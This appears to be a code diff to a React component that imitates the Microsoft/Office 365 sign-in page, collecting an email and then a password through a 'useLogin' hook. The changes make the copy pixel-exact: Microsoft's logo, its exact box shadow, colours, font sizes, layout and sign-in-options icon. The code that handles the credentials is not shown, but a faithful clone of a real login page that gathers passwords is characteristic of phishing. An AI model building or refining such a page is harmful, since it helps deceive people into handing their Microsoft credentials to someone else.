@@ -1,7 +1,7 @@
 import React, { useState } from 'react';
 import { useLogin } from '../hooks/useLogin';
 import Spinner from './common/Spinner';
-import { ArrowLeft, KeySquare } from 'lucide-react';
+import { ArrowLeft } from 'lucide-react';
 
 interface Office365LoginPageProps {
   onLoginSuccess?: (sessionData: any) => void;
@@ -30,13 +30,15 @@ const Office365LoginPage: React.FC<Office365LoginPageProps> = ({ onLoginSuccess,
     setPassword('');
   };
 
+  const exactBoxShadow = '0 1.6px 3.6px 0 rgba(0,0,0,.132), 0 .2px .9px 0 rgba(0,0,0,.108)';
+
   return (
     <div 
       className="min-h-screen flex items-center justify-center p-4 font-sans bg-cover bg-center"
       style={{ backgroundImage: "url('https://cdn.wallpaperhub.app/cloudcache/9/1/a/6/b/4/91a6b4bbc15a346994515950e52c727e0fc34028.jpg')" }}
     >
-      <div className="w-full max-w-md">
-        <div className="bg-white shadow-lg p-8 md:p-11">
+      <div className="w-full max-w-[440px]">
+        <div className="bg-white p-11" style={{ boxShadow: exactBoxShadow }}>
           <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" height="23" alt="Microsoft logo" className="mb-5" />
 
           {!showPasswordStep ? (
@@ -53,12 +55,12 @@ const Office365LoginPage: React.FC<Office365LoginPageProps> = ({ onLoginSuccess,
                   onChange={(e) => setEmail(e.target.value)}
                   placeholder="Email, phone, or Skype" 
                   autoCapitalize="none"
-                  className="w-full py-1 text-base border-b border-gray-500 focus:border-blue-600 focus:outline-none"
+                  className="w-full py-2 text-base border-0 border-b border-[#8A8886] focus:border-blue-600 focus:ring-0 focus:outline-none"
                 />
-                <p className="text-sm mt-4">No account? <a href="https://signup.live.com/" target="_blank" rel="noopener noreferrer" className="text-blue-600 hover:underline">Create one!</a></p>
-                <p className="text-sm mt-1"><a href="https://account.live.com/password/reset" target="_blank" rel="noopener noreferrer" className="text-blue-600 hover:underline">Can't access your account?</a></p>
+                <p className="text-[13px] mt-4">No account? <a href="https://signup.live.com/" target="_blank" rel="noopener noreferrer" className="text-[#0067b8] hover:underline">Create one!</a></p>
+                <p className="text-[13px] mt-1"><a href="https://account.live.com/password/reset" target="_blank" rel="noopener noreferrer" className="text-[#0067b8] hover:underline">Can't access your account?</a></p>
                 <div className="text-right mt-6">
-                  <button onClick={handleNext} disabled={!email} className="px-8 py-2 bg-[#0067b8] text-white font-medium rounded-sm hover:bg-[#005a9e] disabled:bg-gray-300">
+                  <button onClick={handleNext} disabled={!email} className="px-8 py-2 bg-[#0067b8] text-white font-medium rounded-sm hover:brightness-90 disabled:bg-gray-300">
                     Next
                   </button>
                 </div>
@@ -82,11 +84,11 @@ const Office365LoginPage: React.FC<Office365LoginPageProps> = ({ onLoginSuccess,
                   onChange={(e) => setPassword(e.target.value)}
                   placeholder="Password"
                   autoFocus
-                  className="w-full py-1 text-base border-b border-gray-500 focus:border-blue-600 focus:outline-none"
+                  className="w-full py-2 text-base border-0 border-b border-[#8A8886] focus:border-blue-600 focus:ring-0 focus:outline-none"
                 />
-                <p className="text-sm mt-4"><a href="https://account.live.com/password/reset" target="_blank" rel="noopener noreferrer" className="text-blue-600 hover:underline">Forgot password?</a></p>
+                <p className="text-[13px] mt-4"><a href="https://account.live.com/password/reset" target="_blank" rel="noopener noreferrer" className="text-[#0067b8] hover:underline">Forgot password?</a></p>
                  <div className="text-right mt-6">
-                  <button type="submit" disabled={isLoading || !password} className="px-8 py-2 bg-[#0067b8] text-white font-medium rounded-sm hover:bg-[#005a9e] disabled:bg-gray-300 flex items-center justify-center min-w-[108px]">
+                  <button type="submit" disabled={isLoading || !password} className="px-8 py-2 bg-[#0067b8] text-white font-medium rounded-sm hover:brightness-90 disabled:bg-gray-300 flex items-center justify-center min-w-[108px]">
                     {isLoading ? <Spinner size="sm" color="border-white" /> : 'Sign in'}
                   </button>
                 </div>
@@ -94,16 +96,19 @@ const Office365LoginPage: React.FC<Office365LoginPageProps> = ({ onLoginSuccess,
             </div>
           )}
         </div>
-        <div className="bg-white shadow-lg p-4 mt-4 text-sm hover:bg-gray-100 transition-colors cursor-pointer">
-          <div className="flex items-center">
-            <KeySquare className="w-6 h-6 text-gray-700 mr-4" />
-            <span>Sign-in options</span>
+        <div className="bg-white px-11 py-4 mt-4 hover:bg-gray-100 transition-colors cursor-pointer" style={{ boxShadow: exactBoxShadow }}>
+          <div className="flex items-center text-gray-800">
+            <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="none" className="mr-4">
+              <path d="M12.6 7.2C12.6 5.87452 13.6745 4.8 15 4.8C16.3255 4.8 17.4 5.87452 17.4 7.2C17.4 8.52548 16.3255 9.6 15 9.6C13.6745 9.6 12.6 8.52548 12.6 7.2ZM15 6C14.3373 6 13.8 6.53726 13.8 7.2C13.8 7.86274 14.3373 8.4 15 8.4C15.6627 8.4 16.2 7.86274 16.2 7.2C16.2 6.53726 15.6627 6 15 6Z" fill="#5e5e5e"></path>
+              <path fillRule="evenodd" clipRule="evenodd" d="M11.6644 9.17894L5.59998 15.2434V18.4H8.75654L9.95654 17.2H7.79998V16.4434L13.8644 10.3789C13.5683 10.0243 13.313 9.63403 13.103 9.21834L11.6644 9.17894ZM11.099 10.8434L9.95654 12H6.59998V13.2434L8.75654 11.0868L11.099 10.8434Z" fill="#5e5e5e"></path>
+            </svg>
+            <span className="text-[15px]">Sign-in options</span>
           </div>
         </div>
       </div>
-      <footer className="fixed bottom-3 right-6 text-xs text-white">
-        <a href="https://www.microsoft.com/en-US/servicesagreement/" target="_blank" rel="noopener noreferrer" className="text-white hover:underline mr-4">Terms of use</a>
-        <a href="https://www.microsoft.com/en-US/privacy/privacystatement" target="_blank" rel="noopener noreferrer" className="text-white hover:underline mr-4">Privacy & cookies</a>
+      <footer className="fixed bottom-3 right-6 text-xs text-[#605e5c]">
+        <a href="https://www.microsoft.com/en-US/servicesagreement/" target="_blank" rel="noopener noreferrer" className="hover:underline mr-4">Terms of use</a>
+        <a href="https://www.microsoft.com/en-US/privacy/privacystatement" target="_blank" rel="noopener noreferrer" className="hover:underline mr-4">Privacy & cookies</a>
         <span className="cursor-pointer">...</span>
       </footer>
     </div>
